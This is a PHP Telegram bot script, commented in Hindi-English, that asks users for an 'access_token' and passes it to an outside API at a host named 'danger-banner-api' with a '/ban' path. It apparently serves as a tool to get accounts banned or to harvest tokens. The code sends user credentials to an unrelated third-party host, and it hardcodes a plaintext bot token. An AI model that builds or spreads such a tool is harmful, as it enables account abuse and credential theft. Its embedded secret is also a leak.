<?php
// Apna Bot Token yahan daalein
$botToken = "8719706728:AAHKw6AXOIwO_HGhHbMUFqhhxSYT7ca9soo";

// Telegram se aane wala data fetch karna
$update = file_get_contents('php://input');
$updateArray = json_decode($update, TRUE);

if (isset($updateArray["message"])) {
    $chatId = $updateArray["message"]["chat"]["id"];
    $text = $updateArray["message"]["text"];

    // State management ke liye file (User kis step par hai track karne ke liye)
    $stateFile = "states.json";
    $states = file_exists($stateFile) ? json_decode(file_get_contents($stateFile), true) : [];
    $userState = isset($states[$chatId]) ? $states[$chatId] : 'none';

    // COMMAND: /start
    if ($text == "/start") {
        $states[$chatId] = 'none';
        file_put_contents($stateFile, json_encode($states));

        // Keyboard Setup
        $keyboard = [
            'keyboard' => [
                [['text' => '⚡ EXE']]
            ],
            'resize_keyboard' => true,
            'one_time_keyboard' => false
        ];
        
        $reply = "🟢 <b>SYSTEM ONLINE</b>\n\nWelcome to the <b>EXE BOT</b> interface.\nClick the <b>⚡ EXE</b> button below to initialize the API process.";
        sendMessage($chatId, $reply, $keyboard, $botToken);
    }
    
    // BUTTON CLICK: ⚡ EXE
    elseif ($text == "⚡ EXE" || $text == "EXE") {
        // State update karo ki ab bot access_token ka wait karega
        $states[$chatId] = 'waiting_for_token';
        file_put_contents($stateFile, json_encode($states));

        $reply = "⚠️ <b>AUTHORIZATION REQUIRED</b>\n\nPlease enter your <code>access_token</code> to execute the backend API.";
        sendMessage($chatId, $reply, null, $botToken);
    }
    
    // INPUT: Access Token aane par
    elseif ($userState == 'waiting_for_token') {
        // State reset kar do
        $states[$chatId] = 'none';
        file_put_contents($stateFile, json_encode($states));

        $accessToken = urlencode($text);
        $apiUrl = "https://danger-banner-api.onrender.com/ban?access=" . $accessToken;

        // Processing message
        sendMessage($chatId, "⏳ <i>Executing request on backend...</i>", null, $botToken);

        // API Call using cURL (e-panel pe cURL zyada stable hota hai)
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $apiUrl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        // Agar render pe timeout hota hai toh ye madad karega
        curl_setopt($ch, CURLOPT_TIMEOUT, 30); 
        $response = curl_exec($ch);
        curl_close($ch);

        // Agar API blank response de ya down ho
        if(!$response) {
            $response = "Error: API unreachable or returned empty data.";
        }

        // Final Response Send
        $reply = "🌐 <b>API RESPONSE:</b>\n\n<code>" . htmlspecialchars($response) . "</code>\n\n<i>Operation Completed.</i>";
        sendMessage($chatId, $reply, null, $botToken);
    }
}

// Function: Telegram pe message bhejne ke liye cURL
function sendMessage($chatId, $message, $keyboard = null, $botToken) {
    $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
    $post_fields = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    if ($keyboard !== null) {
        $post_fields['reply_markup'] = json_encode($keyboard);
    }
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_exec($ch);
    curl_close($ch);
}
?>
